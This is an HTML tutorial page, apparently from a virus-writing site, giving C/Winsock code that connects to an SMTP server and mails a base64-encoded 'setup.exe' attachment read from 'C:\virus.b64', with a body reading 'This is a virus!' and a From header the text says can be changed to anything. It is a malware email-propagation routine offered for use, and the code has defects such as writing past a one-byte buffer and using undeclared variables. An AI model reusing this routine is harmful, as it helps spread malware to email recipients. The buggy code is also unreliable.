<html>
<!-- MI_pirat  -->
<head>
  <title>SMTP</title>
<style type="text/css">
a:hover { color:AAABBB ; text-decoration:none}
a:visited { text-decoration: none}
a:link {text-decoration: none}
body {scrollbar-face-color: #000000; 
scrollbar-shadow-color: #c0c0c0; 
scrollbar-highlight-color: #c0c0c0; 
scrollbar-3dlight-color:#c0c0c0; 
scrollbar-darkshadow-color:#c0c0c0; 
scrollbar-track-color: black; 
scrollbar-arrow-color: #c0c0c0; 
}
</style>
</head>

<body text="#C0C0C0" bgcolor="#000000" vlink="#808080" link="#808080" background="../Rom/bg.gif" bgproperties="fixed" alink="#808080">
<center><h2>SMTP Tutorial</center></h2>
<p>
<h5>Contents</h5>
<br><b><a href="#1"> 1.1 Basic Winsock stuff & connecting to a server</b>
<br><b><a href="#2"> 1.2 Sending e-mails from a SMTP server</b>
<br><b><a href="#3"> 1.3 Base64 encoding</b>
<br><b><a href="#4"> 1.4 End</b>
<p><b><a name="1"> 1.1 Basic Winsock stuff & connecting to a server</b>
<p>
 In order to connect to a server and send e-mails, you have to use winsock. It's not as hard as it looks at first. Here's some code that connects to a server at port 25 (SMTP) using the TCP/IP protocol:
<br>
<br>
#include <winsock.h>
<br>
<br>
WORD version = MAKEWORD(1,1);
<br>
WSADATA wsaData;
<br>
SOCKET theSocket;
<br>
char Buf[256],myBuf[256]; 	// Buf -for server answer and myBuf -for your commands
<br>
int nRet;  // For eventual errors
<br>
<br>
int conect(char *server) { //Connects to a server using "Winsock"
<br>
<br>
// Start up Winsock
<br>
nRet=WSAStartup(version, &wsaData);
<br>
if (nRet!=0) {return(0);}
<br>
<br>
// Store information about the server
<br>
LPHOSTENT lpHostEntry;
<br>
<br>
lpHostEntry = gethostbyname(server);
<br>
if (lpHostEntry == NULL) {
<br>
WSACleanup();
<br>
return(0);
<br>
}
<br>
<br>
// Create the socket
<br>
theSocket = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);	
<br>
if (theSocket == INVALID_SOCKET) {
<br>
WSACleanup();
<br>
return(0);
<br>
}
<br>
<br>
SOCKADDR_IN saServer;
<br>
saServer.sin_family = AF_INET;
<br>
saServer.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list);
<br>
saServer.sin_port = htons(25);		// Port 25
<br>
<br>
// Connect to the server
<br>
nRet = connect(theSocket,(LPSOCKADDR)&saServer,sizeof(struct sockaddr));	
<br>
if (nRet == SOCKET_ERROR) {
<br>
WSACleanup();
<br>
return(0);
<br>
}
<br>
<br>
nRet = recv(theSocket,Buf,sizeof(Buf),0);			
<br>
if (nRet == SOCKET_ERROR) {
<br>
WSACleanup();
<br>
return(0);
<br>
}
<br>
<br>
if (Buf[0]=='4' || Buf[0]=='5') return(0);	// Not a '220' Hello
<br>
if (Buf[0]=='2' && Buf[1]=='2' && Buf[2]=='0') {
<br>
sendmail();					// Ok to send mails
<br>
}
<br>
<br>
//Close the connection
<br>
closesocket(theSocket);
<br>
// Shutdown Winsock
<br>
WSACleanup();
<br>
}
<br>
<br>
 Use like this: conect("server.name");
<br>
 This function returns 0 if there is an error, any error. If everything goes okay it will call the sendmail(); function that actually sends the e-mail.
<br>
 The first part (down to "Connect to the server") is the Winsock init, then the connect function is the one that actually connects to the server. The recv func. gets the server's respounse (in this case we are only interested that the first 3 bytes are '220' - that's ok).
<p>
 <b><a name="2">1.2 Sending e-mails from a SMTP server</b>
<p>
 Now that you have a working connection you can send e-mails. The next function sends an e-mail to the specified server.
<br>
<br>
void sendmail() { //Sends an e-mail with MIME encoding
<br>
int err=0;
<br>
char ch[1];
<br>
<br>
// "HELO" the server
<br>
strcpy(myBuf, "HELO <");
<br>
strcat(myBuf,helo);
<br>
strcat(myBuf,">\x0d\x0a");
<br>
send(theSocket,myBuf,strlen(myBuf),0);
<br>
<br>
recv(theSocket,Buf,sizeof(Buf),0);
<br>
<br>
// MAIL FROM...
<br>
if (Buf[0]=='2' && Buf[1]=='5' && Buf[2]=='0') {
<br>
strcpy(myBuf, "MAIL FROM:<");
<br>
strcat(myBuf,email);
<br>
strcat(myBuf,">\x0d\x0a");
<br>
send(theSocket,myBuf,strlen(myBuf),0);
<br>
<br>
recv(theSocket,Buf,sizeof(Buf),0);
<br>
}
<br>
if (Buf[0]=='4' || Buf[0]=='5') err=1;
<br>
<br>
if (Buf[0]=='2' && Buf[1]=='5' && Buf[2]=='0' && err==0) {
<br>
<br>
// MAIL TO...
<br>
strcpy(myBuf, "RCPT TO:<");
<br>
strcat(myBuf, mailto);
<br>
strcat(myBuf, ">\x0d\x0a");
<br>
send(theSocket,myBuf,strlen(myBuf),0);
<br>
<br>
recv(theSocket,Buf,sizeof(Buf),0);
<br>
}
<br>
if (Buf[0]=='4' || Buf[0]=='5') err=1;
<br>
<br>
if (Buf[0]=='2' && Buf[1]=='5' && err==0) {
<br>
strcpy(myBuf, "DATA\x0d\x0a");
<br>
send(theSocket,myBuf,strlen(myBuf),0);
<br>
<br>
recv(theSocket,Buf,sizeof(Buf),0);
<br>
}
<br>
if (Buf[0]=='4' || Buf[0]=='5') err=1;
<br>
<br>
// MIME encoded message
<br>
if (Buf[0]=='3' && Buf[1]=='5' && Buf[2]=='4' && err==0) {
<br>
<br>
strcpy(myBuf, "From: <");
<br>
strcat(myBuf, email);				// Can change "email" to anything
<br>
strcat(myBuf, ">\x0d\x0a");
<br>
send(theSocket,myBuf,strlen(myBuf),0);
<br>
<br>
strcpy(myBuf, "Subject: Hello\x0d\x0a");	// Your subject goes here
<br>
send(theSocket,myBuf,strlen(myBuf),0);
<br>
<br>
// MIME stuff
<br>
strcpy(myBuf, "MIME-Version: 1.0\x0d\x0a");
<br>
send(theSocket,myBuf,strlen(myBuf),0);
<br>
strcpy(myBuf, "Content-Type: multipart/mixed;\x0d\x0a");
<br>
send(theSocket,myBuf,strlen(myBuf),0);
<br>
strcpy(myBuf, "    boundary = \"bla\"\x0d\x0a");
<br>
send(theSocket,myBuf,strlen(myBuf),0);
<br>
strcpy(myBuf, "X-Priority: 3\x0d\x0a");
<br>
send(theSocket,myBuf,strlen(myBuf),0);
<br>
strcpy(myBuf, "X -MSMail - Priority: Normal\x0d\x0a");
<br>
send(theSocket,myBuf,strlen(myBuf),0);
<br>
strcpy(myBuf, "X-Mailer: mailer@localhost\x0d\x0a\x0d\x0a");
<br>
send(theSocket,myBuf,strlen(myBuf),0);
<br>
strcpy(myBuf, "This is a multi-part message in MIME format.\x0d\x0a\x0d\x0a");
<br>
send(theSocket,myBuf,strlen(myBuf),0);
<br>
strcpy(myBuf, "--bla\x0d\x0a");
<br>
send(theSocket,myBuf,strlen(myBuf),0);
<br>
strcpy(myBuf, "Content-Type: text/plain; charset:us-ascii\x0d\x0a\x0d\x0a");
<br>
send(theSocket,myBuf,strlen(myBuf),0);
<br>
<br>
// This is the message (change it as you whish)
<br>
strcpy(myBuf, "This is a virus!\x0d\x0a\x0d\x0a");
<br>
send(theSocket,myBuf,strlen(myBuf),0);
<br>
strcpy(myBuf, "--bla\x0d\x0a");
<br>
send(theSocket,myBuf,strlen(myBuf),0);
<br>
strcpy(myBuf, "Content-Type: application/x-msdownload;\x0d\x0a");
<br>
send(theSocket,myBuf,strlen(myBuf),0);
<br>
<br>
// This is the attachement file name, also change this
<br>
strcpy(myBuf, "    name = \"setup.exe\"\x0d\x0a");
<br>
send(theSocket,myBuf,strlen(myBuf),0);
<br>
strcpy(myBuf, "Content-Transfer-Encoding: base64\x0d\x0a");
<br>
send(theSocket,myBuf,strlen(myBuf),0);
<br>
strcpy(myBuf, "Content-Disposition: attachment;\x0d\x0a");
<br>
send(theSocket,myBuf,strlen(myBuf),0);
<br>
<br>
// This is the attachement file name, also change this
<br>
strcpy(myBuf, "    filename = \"setup.exe\"\x0d\x0a\x0d\x0a");
<br>
send(theSocket,myBuf,strlen(myBuf),0);
<br>
<br>
//Send the file byte by byte
<br>
fstream f("C:\\virus.b64",ios::in);	// The file must be Base64 encoded
<br>
for (int k=0;k<base64size;k++) {
<br>
f.get(ch[1]);
<br>
strcpy(myBuf,&ch[1]);
<br>
send(theSocket,myBuf,strlen(myBuf),0);
<br>
}
<br>
f.close();
<br>
<br>
strcpy(myBuf, "\x0d\x0a--bla--\x0d\x0a");
<br>
send(theSocket,myBuf,strlen(myBuf),0);
<br>
<br>
strcpy(myBuf, "\x0d\x0a.\x0d\x0a");	// End transmission ;)
<br>
send(theSocket,myBuf,strlen(myBuf),0);
<br>
recv(theSocket,Buf,sizeof(Buf),0);
<br>
}
<br>
if (Buf[0]=='4' || Buf[0]=='5') err=1;
<br>
<br>
// QUIT (bye bye)
<br>
strcpy(myBuf, "QUIT\x0d\x0a");
<br>
send(theSocket,myBuf,strlen(myBuf),0);
<br>
}
<br>
<br>
 That's about all. Now what the code really does:
<br> - First it sends a "HELO &lt;emaildomain &gt;\x0d\x0a" . emaildomain is the domain that follows after the "@" (e.g. virus@virii.org , emaildomain is "virii.org"). If the answer is 250 go next.
<br> - Send "MAIL FROM:&lt;email&gt;\x0d\x0a" (email must be a real e-mail address). If the answer is 250 go next.
<br> - Send "RCPT TO:&lt;mailto&gt;\x0d\x0a". If the answer is 250 go next.
<br> - Send "DATA\x0d\x0a".If the answer is 345 go next.
<br> - Send your MIME message and Base64 encoded file. End with "\x0d\x0a.\x0d\x0a".
<br> - Send "QUIT\x0d\x0a".
<p>
<b> <a name="3">1.3 Base64 encoding</b>
<p>
 Base64 is an encoding algorithm that uses 64 characters. It is used to send data over the Net. I will not include any base64 encoding/decoding functions because mine really suck and you can get them from any virus site or zine.
<p>
<b> <a name="4">1.4 End</b>
<p>
 That's all folks. Hope you enjoied this tut. ! Greetz to everyone I know (I won't write them all here).
<center><h3>by MI_pirat</center></h3>
<br>
<a href="codes2.htm">Back</a>